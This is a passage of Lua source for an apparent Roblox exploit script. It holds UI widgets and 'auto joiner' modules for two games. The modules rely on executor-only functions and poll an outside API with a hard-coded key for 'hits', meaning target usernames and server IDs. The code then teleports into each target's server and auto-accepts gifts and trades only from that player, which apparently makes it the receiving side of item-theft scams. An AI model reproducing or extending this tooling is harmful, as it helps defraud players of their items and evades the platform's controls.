			TextButton.BackgroundTransparency = v169.bgTransparency
			TextButton.BorderSizePixel = 0
			TextButton.Size = UDim2.new(0, 0, 0, v168.height)
			TextButton.AutomaticSize = Enum.AutomaticSize.X
			TextButton.Name = "Button"
			TextButton.Parent = p68
			TextButton.AutoButtonColor = false
			v165.applyCorner(TextButton, 6)

			local UIPadding = Instance.new("UIPadding")

			UIPadding.PaddingLeft = UDim.new(0, v168.paddingH)
			UIPadding.PaddingRight = UDim.new(0, v168.paddingH)
			UIPadding.Parent = TextButton

			local UIStroke = Instance.new("UIStroke")

			UIStroke.Color = v169.border
			UIStroke.Thickness = 1

			local transparency

			if variant == "primary" then
				transparency = 1
			else
				transparency = 0.3
			end

			UIStroke.Transparency = transparency
			UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			UIStroke.Parent = TextButton

			local u174 = true

			TextButton.MouseEnter:Connect(function()
				if u174 then
					TextButton.BackgroundColor3 = v169.bgHover

					if variant == "ghost" then
						TextButton.BackgroundTransparency = 0
					end
				end
			end)
			TextButton.MouseLeave:Connect(function()
				if u174 then
					TextButton.BackgroundColor3 = v169.bg
					TextButton.BackgroundTransparency = v169.bgTransparency
				end
			end)
			TextButton.MouseButton1Click:Connect(function()
				if u174 and v166.onClick then
					v166.onClick()
				end
			end)

			local function v175(p70)
				TextButton.Text = p70
			end

			return {
				button = TextButton,
				setText = v175,
				setEnabled = function(p71)
					u174 = p71

					local bg

					if p71 then
						bg = v169.bg
					else
						bg = v165.Colors.Surface
					end

					TextButton.BackgroundColor3 = bg

					local text

					if p71 then
						text = v169.text
					else
						text = v165.Colors.TextDim
					end

					TextButton.TextColor3 = text

					local border

					if p71 then
						border = v169.border
					else
						border = v165.Colors.Border
					end

					UIStroke.Color = border
				end
			}
		end
	}
end
handlers.m = function()
	local v179 = handlers.load("b")

	return {
		create = function(p72, p73)
			local v180 = p73 or {}
			local maxLines = v180.maxLines or 50
			local height = v180.height or 100
			local t6 = {}
			local Frame = Instance.new("Frame")

			Frame.BackgroundColor3 = v179.Colors.Surface
			Frame.BorderSizePixel = 0
			Frame.Size = UDim2.new(1, 0, 0, height)
			Frame.Name = "LogsContainer"
			Frame.Parent = p72
			v179.applyCorner(Frame, 8)

			local UIStroke = Instance.new("UIStroke")

			UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			UIStroke.Color = v179.Colors.Border
			UIStroke.Thickness = 1
			UIStroke.Transparency = 0.3
			UIStroke.Parent = Frame

			local ScrollingFrame = Instance.new("ScrollingFrame")

			ScrollingFrame.BackgroundTransparency = 1
			ScrollingFrame.BorderSizePixel = 0
			ScrollingFrame.Size = UDim2.new(1, -8, 1, -8)
			ScrollingFrame.Position = UDim2.new(0, 4, 0, 4)
			ScrollingFrame.ScrollBarThickness = 4
			ScrollingFrame.ScrollBarImageColor3 = v179.Colors.TextMuted
			ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
			ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
			ScrollingFrame.Name = "LogsScroll"
			ScrollingFrame.Parent = Frame

			local UIListLayout = Instance.new("UIListLayout")

			UIListLayout.FillDirection = Enum.FillDirection.Vertical
			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIListLayout.Padding = UDim.new(0, 2)
			UIListLayout.Parent = ScrollingFrame

			local t7 = {
				info = v179.Colors.TextMuted,
				warn = Color3.fromRGB(255, 193, 7),
				error = Color3.fromRGB(244, 67, 54),
				success = v179.Colors.Accent
			}

			local function v189(p74)
				local v190 = os.date("*t", p74)

				return string.format("%02d:%02d:%02d", v190.hour, v190.min, v190.sec)
			end
			local function v191(p75, p76)
				local v192 = p76 or "info"
				local now = os.time()

				table.insert(t6, {
					message = p75,
					timestamp = now,
					level = v192
				})

				while maxLines < #t6 do
					table.remove(t6, 1)

					local v194

					for _, v in ScrollingFrame:GetChildren() do
						if v:IsA("TextLabel") and (v194 == nil or v.LayoutOrder < v194.LayoutOrder) then
							v194 = v
						end
					end

					if v194 then
						v194:Destroy()
					end
				end

				local TextLabel = Instance.new("TextLabel")

				TextLabel.Font = Enum.Font.Code
				TextLabel.TextColor3 = t7[v192] or v179.Colors.TextMuted
				TextLabel.TextSize = 11
				TextLabel.TextXAlignment = Enum.TextXAlignment.Left
				TextLabel.Text = string.format("[%s] %s", v189(now), p75)
				TextLabel.AutomaticSize = Enum.AutomaticSize.XY
				TextLabel.BackgroundTransparency = 1
				TextLabel.BorderSizePixel = 0
				TextLabel.LayoutOrder = #t6
				TextLabel.RichText = true
				TextLabel.Name = "LogEntry_" .. #t6
				TextLabel.Parent = ScrollingFrame
				task.defer(function()
					ScrollingFrame.CanvasPosition = Vector2.new(0, ScrollingFrame.AbsoluteCanvasSize.Y)
				end)
			end
			local function v198()
				t6 = {}

				for _, v in ScrollingFrame:GetChildren() do
					if v:IsA("TextLabel") then
						v:Destroy()
					end
				end
			end

			return {
				Frame = Frame,
				ScrollFrame = ScrollingFrame,
				addLog = v191,
				clear = v198,
				getEntries = function()
					return t6
				end
			}
		end
	}
end
handlers.n = function()
	local v201 = handlers.load("b")

	return {
		create = function(p77, p78)
			local v202 = p78 or {}
			local countdown = v202.countdown or false
			local startTime = v202.startTime or 0
			local autoStart = v202.autoStart or false
			local u206 = startTime
			local u207 = false
			local connection
			local n6 = 0
			local TextLabel = Instance.new("TextLabel")

			TextLabel.Font = Enum.Font.Code
			TextLabel.TextColor3 = v201.Colors.Text
			TextLabel.TextSize = 13
			TextLabel.TextXAlignment = Enum.TextXAlignment.Right
			TextLabel.AutomaticSize = Enum.AutomaticSize.XY
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Name = "TimerLabel"
			TextLabel.Parent = p77

			local function v211(p79)
				local v212 = math.floor(p79 / 3600)
				local v213 = math.floor(p79 % 3600 / 60)
				local v214 = math.floor(p79 % 60)

				if v212 > 0 then
					return string.format("%02d:%02d:%02d", v212, v213, v214)
				end

				return string.format("%02d:%02d", v213, v214)
			end
			local function v215()
				TextLabel.Text = v211(u206)

				if countdown then
					if u206 <= 10 then
						TextLabel.TextColor3 = Color3.fromRGB(244, 67, 54)
					elseif u206 <= 30 then
						TextLabel.TextColor3 = Color3.fromRGB(255, 193, 7)
					else
						TextLabel.TextColor3 = v201.Colors.Text
					end
				end
			end
			local function v216()
				u207 = false

				if connection then
					connection:Disconnect()
					connection = nil
				end
			end
			local function v217()
				if u207 then
					return
				end

				u207 = true
				n6 = tick()
				connection = game:GetService("RunService").Heartbeat:Connect(function()
					local now = tick()
					local v219 = now - n6

					n6 = now

					if countdown then
						u206 = math.max(0, u206 - v219)

						if u206 <= 0 then
							v216()
						end
					else
						u206 += v219
					end

					v215()
				end)
			end
			local function v220()
				v216()
				u206 = startTime
				v215()
			end
			local function v221(p80)
				u206 = p80
				startTime = p80
				v215()
			end
			local function v222()
				return u206
			end
			local function v223()
				return u207
			end

			v215()

			if autoStart then
				v217()
			end

			return {
				Label = TextLabel,
				start = v217,
				stop = v216,
				reset = v220,
				setTime = v221,
				getTime = v222,
				isRunning = v223
			}
		end
	}
end
handlers.o = function()
	return {
		Styling = handlers.load("b"),
		Interaction = handlers.load("c"),
		Window = handlers.load("d"),
		Tab = handlers.load("e"),
		Page = handlers.load("f"),
		Row = handlers.load("g"),
		Toggle = handlers.load("h"),
		Badge = handlers.load("i"),
		Status = handlers.load("j"),
		Counter = handlers.load("k"),
		Button = handlers.load("l"),
		Logs = handlers.load("m"),
		Timer = handlers.load("n")
	}
end
handlers.p = function()
	local v224 = handlers.load("a")
	local v225 = handlers.load("o")

	_G.connectionEnabled = true

	local t8 = {
		connectionEnabled = true,
		optiEnabled = false
	}

	if isfile("prev-config.json") then
		local ok, result = pcall(function()
			return game:GetService("HttpService"):JSONDecode(readfile("prev-config.json"))
		end)

		if ok and result then
			t8 = result

			local warn_ = warn
			local v230 = ([[PREV [AUTO JOINER]: CONFIG LOADING SUCCESSFUL
 connectionEnabled: %*
 optiEnabled: %*]]):format(t8.connectionEnabled, t8.optiEnabled)

			warn_(v230)

			if t8.connectionEnabled == nil then
				warn("PREV [AUTO JOINER]: FAILED TO GET CONFIG connectionEnabled", t8.connectionEnabled)
				t8.connectionEnabled = true
			end

			if t8.optiEnabled == nil then
				t8.optiEnabled = false
			end
		else
			warn("PREV [AUTO JOINER]: ERROR LOAD CONFIG")
		end
	else
		writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t8))
	end

	local ScreenGui = Instance.new("ScreenGui")

	ScreenGui.IgnoreGuiInset = false
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.Parent = game:GetService("CoreGui")

	local v232 = v225.Window.create(ScreenGui)
	local v233 = v225.Tab.create(v232.Tabs, {
		text = "Stats",
		active = true
	})
	local v234 = v225.Tab.create(v232.Tabs, {
		text = "Settings",
		active = false
	})
	local v235 = v225.Page.create(v232.Container, {
		name = "Stats"
	})
	local v236 = v225.Page.create(v232.Container, {
		name = "Settings"
	})
	local v237 = v225.Row.create(v235)

	v225.Row.addTitle(v237, "API Status:")

	local v238 = v225.Status.create(v225.Row.addContent(v237), {
		active = false,
		activeText = "Connected",
		inactiveText = "Disconnected"
	})
	local v239 = v225.Row.create(v235)

	v225.Row.addTitle(v239, "Pets in Inventory:")

	local v240 = v225.Counter.create(v225.Row.addContent(v239), {
		title = "Pets in Inventory:",
		value = 0
	})
	local v241 = v225.Row.create(v235)

	v225.Row.addTitle(v241, "Timer:")
	v225.Timer.create(v225.Row.addContent(v241), {
		autoStart = true
	})

	local v242 = v225.Status.create(v232.MinimizedContent, {
		active = false,
		activeText = "Connected",
		inactiveText = "Disconnected"
	})
	local v243 = v225.Counter.create(v232.MinimizedContent, {
		value = 0
	})

	v225.Timer.create(v232.MinimizedContent, {
		autoStart = true
	})

	local t9 = {
		setActive = function(p81)
			v238.setActive(p81)
			v242.setActive(p81)
		end
	}
	local t10 = {
		setValue = function(p82)
			v240.setValue(p82)
			v243.setValue(p82)
		end,
		getValue = function()
			return v240.getValue()
		end
	}
	local v246 = v225.Logs.create(v235, {
		maxLines = 50,
		height = 100
	})

	v246.addLog("UI initialized success", "success")

	local v247 = v225.Row.create(v236)

	v225.Row.addTitle(v247, "Allow Hits")
	v225.Toggle.create(v225.Row.addContent(v247), {
		default = t8.connectionEnabled,
		onChanged = function(p83)
			t8.connectionEnabled = p83
			_G.connectionEnabled = t8.connectionEnabled
			writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t8))
		end
	})

	local v248 = v225.Row.create(v236)

	v225.Row.addTitle(v248, "FPS Optimization")
	v225.Toggle.create(v225.Row.addContent(v248), {
		default = t8.optiEnabled,
		onChanged = function(p84)
			t8.optiEnabled = p84

			if p84 == false then
				game:GetService("RunService"):Set3dRenderingEnabled(true)
				setfpscap(60)
			else
				game:GetService("RunService"):Set3dRenderingEnabled(false)
				setfpscap(30)
			end

			writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t8))
		end
	})

	local v249 = v225.Row.create(v236)

	v225.Row.addTitle(v249, "Rejoin")
	v225.Button.create(v225.Row.addContent(v249), {
		text = "Click",
		variant = "primary",
		size = "sm",
		onClick = function()
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
	})
	v233.MouseButton1Click:Connect(function()
		v225.Tab.setActive(v233, true)
		v225.Tab.setActive(v234, false)
		v232.PageLayout:JumpTo(v235)
	end)
	v234.MouseButton1Click:Connect(function()
		v225.Tab.setActive(v233, false)
		v225.Tab.setActive(v234, true)
		v232.PageLayout:JumpTo(v236)
	end)

	if t8.optiEnabled == false then
		game:GetService("RunService"):Set3dRenderingEnabled(true)
		setfpscap(60)
	else
		game:GetService("RunService"):Set3dRenderingEnabled(false)
		setfpscap(30)
	end

	_G.connectionEnabled = t8.connectionEnabled

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local s5 = "bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto"
	local AUTHORIZATION_KEY_ = getfenv(0).AUTHORIZATION_KEY
	local DataService = require(ReplicatedStorage.Modules.DataService)
	local TradingController = require(ReplicatedStorage.Modules.TradeControllers.TradingController)
	local TradeEvents = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("TradeEvents")
	local s6 = ""
	local n7 = 0

	task.spawn(function()
		while task.wait(1) do
			local ok, result = pcall(function()
				local n8 = 0

				for _ in DataService:GetData().PetsData.PetInventory.Data, nil, nil do
					n8 += 1
				end

				return n8
			end)

			if ok then
				t10.setValue(result)
			end
		end
	end)
	spawn(function()
		while task.wait(1) do
			n7 += 1
		end
	end)
	ReplicatedStorage.GameEvents.GiftPet.OnClientEvent:Connect(function(p85, p86, p87)
		task.wait(1.2)
		ReplicatedStorage.GameEvents.AcceptPetGift:FireServer(true, p85)
		v246.addLog(("[GIFT] Accepted gift from %*: %*"):format(p87, p86), "success")
		n7 = 0
	end)
	LocalPlayer:WaitForChild("PlayerGui")
	task.wait(0.1)

	for _, descendant in pairs(LocalPlayer.PlayerGui:WaitForChild("Gift_Notification").Frame:GetDescendants()) do
		if descendant:IsA("ImageButton") and descendant.Name == "Accept" then
			firesignal(descendant.MouseButton1Click)
		end
	end

	LocalPlayer.PlayerGui:WaitForChild("Gift_Notification").Frame.ChildAdded:Connect(function(child)
		firesignal(child:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept").MouseButton1Click)
	end)
	pcall(function()
		if LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("Intro_SCREEN") then
			LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("Intro_SCREEN"):Destroy()
			ReplicatedStorage.GameEvents.LoadScreenEvent:FireServer(LocalPlayer)
		end
	end)
	TradeEvents.SendRequest.OnClientEvent:Connect(function(p88, p89)
		if p89 and p89.Name == s6 then
			v246.addLog(("[TRADE] Accepting request from %*"):format(p89.Name), "warn")
			TradeEvents.AcceptRequest:FireServer(p89)
		else
			pcall(function()
				TradeEvents.RejectRequest:FireServer(p89)
			end)
		end
	end)
	TradingController.OnTradeCreated:Connect(function(p90, p91)
		task.spawn(function()
			local dataAsync = p91:GetDataAsync()

			if not dataAsync then
				return
			end

			local v267 = table.find(dataAsync.players, LocalPlayer)

			if not v267 then
				return
			end

			local v268 = dataAsync.players[v267 == 1 and 2 or 1]

			if v268.Name ~= s6 then
				TradeEvents.Decline:FireServer()

				return
			end

			v246.addLog(("[TRADE] Trade opened with %*"):format(v268.Name), "warn")
			n7 = 0

			while TradingController.CurrentTradeId do
				local data = p91:GetData()

				if data then
					local v270 = table.find(data.players, LocalPlayer)

					if v270 and data.states[v270] ~= "Accepted" then
						TradeEvents.Accept:FireServer()
						task.wait(0.5)

						continue
					end
				end

				break
			end

			while TradingController.CurrentTradeId do
				local data = p91:GetData()

				if data then
					local v272 = table.find(data.players, LocalPlayer)

					if v272 then
						local v273 = v272 == 1 and 2

						if data.states[v272] == "Accepted" and data.states[v273 or 1] == "Accepted" then
							TradeEvents.Confirm:FireServer()
							v246.addLog(("[TRADE] Confirmed trade with %*"):format(v268.Name), "success")
						end

						task.wait(0.3)

						continue
					end
				end

				break
			end
		end)
	end)

	local function v274(p92)
		for _, v in Players:GetPlayers() do
			if string.find(p92, v.Name) then
				return true
			end
		end

		return false
	end

	local t11 = {
		Success = "The teleport was successful.",
		Failure = "The teleport failed for an unknown reason.",
		GameNotFound = "The game could not be found.",
		GameEnded = "The game has ended.",
		GameFull = "The game is full.",
		Unauthorized = "Not authorized to teleport.",
		Flooded = "Too many teleport requests.",
		IsTeleporting = "Already teleporting."
	}

	game:GetService("TeleportService").TeleportInitFailed:Connect(function(p93, p94)
		v246.addLog(("Teleport failed: %*"):format(t11[p94.Name] or "unknown error"), "error")
	end)

	local n9 = 1
	local n10 = 0

	local function v280(p95, p96)
		if p96 == true then
			n9 += 1
		end

		if p95 == true then
			return n9
		end

		return nil
	end

	local n11 = 0

	spawn(function()
		while task.wait(10) do
			local v282 = v280(true, false) or 0

			if n10 < v282 then
				n10 = v282
			else
				t9.setActive(false)
				v246.addLog("Something wrong, can't get hit data.", "error")
				n11 += 1

				if n11 >= 3 then
					v246.addLog("Trying to rejoin...")
					game:GetService("TeleportService"):Teleport(game.PlaceId)
				end
			end
		end
	end)
	spawn(function()
		while task.wait(0.8) do
			local s7 = ""

			if isfile("ProjectReverseAJ.txt") then
				s7 = readfile("ProjectReverseAJ.txt")
			end

			if #s7 > 0 then
				s6 = s7:split(" ")[1]

				if Players:FindFirstChild(s7:split(" ")[1]) then
					if n7 < 30 and v274(s7) then
						v280(false, true)
						warn("WAITING")

						continue
					end
				end
			end

			if _G.connectionEnabled then
				local v284, v285 = v224.getHitForJoiner(s5, AUTHORIZATION_KEY_, "gag")

				v280(false, true)
				t9.setActive(v285 == true)

				if v284 then
					writefile("ProjectReverseAJ.txt", v284.username)

					for i = 1, 5 do
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v284.serverId)
						task.wait(0.5)
					end
				end
			else
				t9.setActive(false)
			end
		end
	end)

	return {}
end
handlers.q = function()
	local v287 = handlers.load("a")
	local v288 = handlers.load("o")

	_G.connectionEnabled = true

	local t12 = {
		connectionEnabled = true,
		optiEnabled = false
	}

	if isfile("prev-config.json") then
		local ok, result = pcall(function()
			return game:GetService("HttpService"):JSONDecode(readfile("prev-config.json"))
		end)

		if ok and result then
			t12 = result

			local warn_ = warn
			local v293 = ([[PREV [AUTO JOINER]: CONFIG LOADING SUCCESSFUL
 connectionEnabled: %*
 optiEnabled: %*]]):format(t12.connectionEnabled, t12.optiEnabled)

			warn_(v293)

			if t12.connectionEnabled == nil then
				warn("PREV [AUTO JOINER]: FAILED TO GET CONFIG connectionEnabled", t12.connectionEnabled)
				t12.connectionEnabled = true
			end

			if t12.optiEnabled == nil then
				t12.optiEnabled = false
			end
		else
			warn("PREV [AUTO JOINER]: ERROR LOAD CONFIG")
		end
	else
		writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t12))
	end

	local ScreenGui = Instance.new("ScreenGui")

	ScreenGui.IgnoreGuiInset = false
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.Parent = game:GetService("CoreGui")
	ScreenGui.ResetOnSpawn = false

	local v295 = v288.Window.create(ScreenGui)
	local v296 = v288.Tab.create(v295.Tabs, {
		text = "Stats",
		active = true
	})
	local v297 = v288.Tab.create(v295.Tabs, {
		text = "Settings",
		active = false
	})
	local v298 = v288.Page.create(v295.Container, {
		name = "Stats"
	})
	local v299 = v288.Page.create(v295.Container, {
		name = "Settings"
	})
	local v300 = v288.Row.create(v298)

	v288.Row.addTitle(v300, "API Status:")

	local v301 = v288.Status.create(v288.Row.addContent(v300), {
		active = false,
		activeText = "Connected",
		inactiveText = "Disconnected"
	})
	local v302 = v288.Row.create(v298)

	v288.Row.addTitle(v302, "Items in Inventory:")

	local v303 = v288.Counter.create(v288.Row.addContent(v302), {
		title = "Items in Inventory:",
		value = 3000
	})
	local v304 = v288.Row.create(v298)

	v288.Row.addTitle(v304, "Timer:")
	v288.Timer.create(v288.Row.addContent(v304), {
		autoStart = true
	})

	local v305 = v288.Status.create(v295.MinimizedContent, {
		active = false,
		activeText = "Connected",
		inactiveText = "Disconnected"
	})
	local v306 = v288.Counter.create(v295.MinimizedContent, {
		value = 3000
	})

	v288.Timer.create(v295.MinimizedContent, {
		autoStart = true
	})

	local t13 = {
		setActive = function(p97)
			v301.setActive(p97)
			v305.setActive(p97)
		end
	}
	local t14 = {
		setValue = function(p98)
			v303.setValue(p98)
			v306.setValue(p98)
		end,
		getValue = function()
			return v303.getValue()
		end
	}
	local v309 = v288.Logs.create(v298, {
		maxLines = 50,
		height = 100
	})

	v309.addLog("UI LIB initialized success", "success")

	local v310 = v288.Row.create(v299)

	v288.Row.addTitle(v310, "Allow Hits")
	v288.Toggle.create(v288.Row.addContent(v310), {
		default = t12.connectionEnabled,
		onChanged = function(p99)
			t12.connectionEnabled = p99
			_G.connectionEnabled = t12.connectionEnabled
			writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t12))
		end
	})

	local v311 = v288.Row.create(v299)

	v288.Row.addTitle(v311, "FPS Optimization")
	v288.Toggle.create(v288.Row.addContent(v311), {
		default = t12.optiEnabled,
		onChanged = function(p100)
			t12.optiEnabled = p100

			if p100 == false then
				game:GetService("RunService"):Set3dRenderingEnabled(true)
				setfpscap(60)
			else
				game:GetService("RunService"):Set3dRenderingEnabled(false)
				setfpscap(30)
			end

			writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t12))
		end
	})

	local v312 = v288.Row.create(v299)

	v288.Row.addTitle(v312, "Rejoin")
	v288.Button.create(v288.Row.addContent(v312), {
		text = "Click",
		variant = "primary",
		size = "sm",
		onClick = function()
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
	})
	v296.MouseButton1Click:Connect(function()
		v288.Tab.setActive(v296, true)
		v288.Tab.setActive(v297, false)
		v295.PageLayout:JumpTo(v298)
	end)
	v297.MouseButton1Click:Connect(function()
		v288.Tab.setActive(v296, false)
		v288.Tab.setActive(v297, true)
		v295.PageLayout:JumpTo(v299)
	end)
	v309.addLog("UI elements initialized success", "success")

	if t12.optiEnabled == false then
		game:GetService("RunService"):Set3dRenderingEnabled(true)
		setfpscap(60)
	else
		local Lighting = game:GetService("Lighting")

		settings().Rendering.QualityLevel = 1
		settings().Rendering.MeshCacheSize = 32
		settings().Rendering.EnableFRM = false
		Lighting.GlobalShadows = false
		Lighting.FogEnd = 10
		Lighting.Brightness = 0

		for _, v in workspace:GetDescendants() do
			if v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Enabled = false
			end
		end

		game:GetService("RunService"):Set3dRenderingEnabled(false)
		setfpscap(30)
	end

	v309.addLog("config initialized success", "success")
	_G.connectionEnabled = t12.connectionEnabled

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Trade = ReplicatedStorage:FindFirstChild("Trade")
	local v318 = cloneref(game:GetService("ContentProvider"))
	local v319 = cloneref(game:GetService("Players"))
	local t15 = {}

	for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
		if descendant:IsA("RemoteFunction") or descendant:IsA("RemoteEvent") then
			table.insert(t15, descendant)
		end
	end

	v318:PreloadAsync(t15)

	local t16 = {
		"MouseButton1Click",
		"MouseButton1Down",
		"Activated"
	}

	TapUI = function(p101)
		for _, v in pairs(t16) do
			for _, v2 in pairs(getconnections(p101[v])) do
				v2.Function()
			end
		end
	end

	local n12 = 0

	task.spawn(function()
		v309.addLog("[LOAD] trying to change device", "info")

		while task.wait(1) do
			n12 += 1
			pcall(function()
				TapUI(v319.LocalPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
				game.ReplicatedStorage.Remotes.Extras.ChangeLastDevice:FireServer("Tablet")
			end)
			pcall(function()
				TapUI(v319.LocalPlayer.PlayerGui.Join.Friends.Play)
			end)

			if v319.LocalPlayer.PlayerGui:FindFirstChild("MainGUI") then
				break
			end
		end

		v309.addLog(("[LOAD] device changed successfully after %* attempts"):format(n12), "success")
	end)
	v309.addLog("[LOAD] skipped device selection but retrying...", "info")

	local v329 = game.PlaceId * 3
	local LastOffer
	local n13 = 0
	local u332
	local s8 = "bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto"

	game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(p102)
		LastOffer = p102.LastOffer
	end)

	local function v334()
		local response, v336 = game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()

		if response == "ReceivingRequest" then
			if v336.Sender.Name == u332 then
				n13 = 0
				game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
			else
				game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
			end
		end

		if response == "StartTrade" then
			n13 = 0
			Trade.AcceptTrade:FireServer(v329, LastOffer)
		end
	end

	task.spawn(function()
		while task.wait() do
			v334()
		end
	end)

	local function v337(p103)
		for _, v in game.Players:GetPlayers() do
			if string.find(p103, v.Name) then
				return true
			end
		end

		return false
	end

	spawn(function()
		while task.wait(1) do
			n13 += 1
		end
	end)

	local t17 = {
		Success = "The teleport was successful.",
		Failure = "The teleport failed for an unknown reason.",
		GameNotFound = "The game that this player attempted to teleport to could not be found.",
		GameEnded = "The game that this player attempted to teleport to has ended.",
		GameFull = "The game that this player attempted to teleport to is full.",
		Unauthorized = "The player is not authorized to complete this teleport.",
		Flooded = "Too many teleport requests have been made recently.",
		IsTeleporting = "The player is currently being teleported."
	}

	game:GetService("TeleportService").TeleportInitFailed:Connect(function(p104, p105)
		v309.addLog(("Teleport failed: %*"):format(t17[p105.Name] or "unknow error"), "error")
	end)
	task.spawn(function()
		while task.wait(1) do
			local n14 = 0
			local response = ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)

			for _, v in response.Weapons.Owned, nil, nil do
				n14 += v
			end

			for _, v in response.Pets.Owned, nil, nil do
				n14 += v
			end

			t14.setValue(n14)
		end
	end)

	local n15 = 1
	local n16 = 0

	local function v349(p106, p107)
		if p107 == true then
			n15 += 1
		end

		if p106 == true then
			return n15
		end
	end

	local n17 = 0

	spawn(function()
		while task.wait(10) do
			local v351 = v349(true, false)

			if n16 < v351 then
				n16 = v351
				n17 = 0
			else
				t13.setActive(false)
				n17 += 1

				if n17 >= 3 then
					v309.addLog("Something wrong, trying to rejoin", "error")

					local v352 = v287.getHitForJoiner(s8, AUTHORIZATION_KEY, "mm2")

					if v352 then
						pcall(function()
							v309.addLog(("[HIT] %*, teleporting..."):format(v352.username), "warn")

							local v354 = ("%*"):format(v352.username)

							writefile("ProjectReverseAJ.txt", v354)

							for i = 1, 5 do
								game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v352.serverId)
								task.wait(0.5)
							end
						end)
					else
						game:GetService("TeleportService"):Teleport(game.PlaceId)
					end
				end
			end
		end
	end)
	v309.addLog("[LOAD] Joiner loading success", "success")

	local u356 = false

	spawn(function()
		while task.wait(0.8) do
			local s9 = ""

			if isfile("ProjectReverseAJ.txt") then
				s9 = readfile("ProjectReverseAJ.txt")
			end

			if #s9 > 0 then
				u332 = s9

				if game:GetService("Players"):FindFirstChild(s9:split(" ")[1]) then
					if n13 < 40 then
						if v337(s9) then
							if not u356 then
								v309.addLog("[HIT] Player on the server, waiting...", "success")
								t13.setActive(true)
								u356 = true
							end

							v349(false, true)

							continue
						end
					end
				end
			end

			if _G.connectionEnabled == false then
				v349(false, true)
			else
				local v358, v359 = v287.getHitForJoiner(s8, AUTHORIZATION_KEY, "mm2")

				pcall(function()
					v349(false, true)
					t13.setActive(v359 == true)
				end)

				if v358 then
					pcall(function()
						v309.addLog(("[HIT] %*, teleporting..."):format(v358.username), "warn")

						local v360 = ("%*"):format(v358.username)

						writefile("ProjectReverseAJ.txt", v360)

						for i = 1, 5 do
							game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v358.serverId)
							task.wait(0.5)
						end
					end)
				end
			end
		end
	end)

	return {}
end
handlers.r = function()
	local v362 = handlers.load("a")
	local v363 = handlers.load("o")

	_G.connectionEnabled = true

	local t18 = {
		connectionEnabled = true,
		optiEnabled = false
	}

	setthreadidentity(8)

	if isfile("prev-config.json") then
		local ok, result = pcall(function()
			return game:GetService("HttpService"):JSONDecode(readfile("prev-config.json"))
		end)

		if ok and result then
			t18 = result

			local warn_ = warn
			local v368 = ([[PREV [AUTO JOINER]: CONFIG LOADING SUCCESSFUL
 connectionEnabled: %*
 optiEnabled: %*]]):format(t18.connectionEnabled, t18.optiEnabled)

			warn_(v368)

			if t18.connectionEnabled == nil then
				warn("PREV [AUTO JOINER]: FAILED TO GET CONFIG connectionEnabled", t18.connectionEnabled)
				t18.connectionEnabled = true
			end

			if t18.optiEnabled == nil then
				t18.optiEnabled = false
			end
		else
			warn("PREV [AUTO JOINER]: ERROR LOAD CONFIG")
		end
	else
		writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t18))
	end

	local ScreenGui = Instance.new("ScreenGui")

	ScreenGui.IgnoreGuiInset = false
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.Parent = game:GetService("CoreGui")
	ScreenGui.ResetOnSpawn = false

	local v370 = v363.Window.create(ScreenGui)
	local v371 = v363.Tab.create(v370.Tabs, {
		text = "Stats",
		active = true
	})
	local v372 = v363.Tab.create(v370.Tabs, {
		text = "Settings",
		active = false
	})
	local v373 = v363.Page.create(v370.Container, {
		name = "Stats"
	})
	local v374 = v363.Page.create(v370.Container, {
		name = "Settings"
	})
	local v375 = v363.Row.create(v373)

	v363.Row.addTitle(v375, "API Status:")

	local v376 = v363.Status.create(v363.Row.addContent(v375), {
		text = "Active"
	})
	local v377 = v363.Row.create(v373)

	v363.Row.addTitle(v377, "Timer:")
	v363.Timer.create(v363.Row.addContent(v377), {
		autoStart = true
	})

	local v378 = v363.Status.create(v370.MinimizedContent, {
		text = "Active"
	})

	v363.Timer.create(v370.MinimizedContent, {
		autoStart = true
	})

	local t19 = {
		setActive = function(p108)
			v376.setActive(p108)
			v378.setActive(p108)
		end
	}
	local v380 = v363.Logs.create(v373, {
		maxLines = 50,
		height = 100
	})

	v380.addLog("UI initialized success", "success")

	local v381 = v363.Row.create(v374)

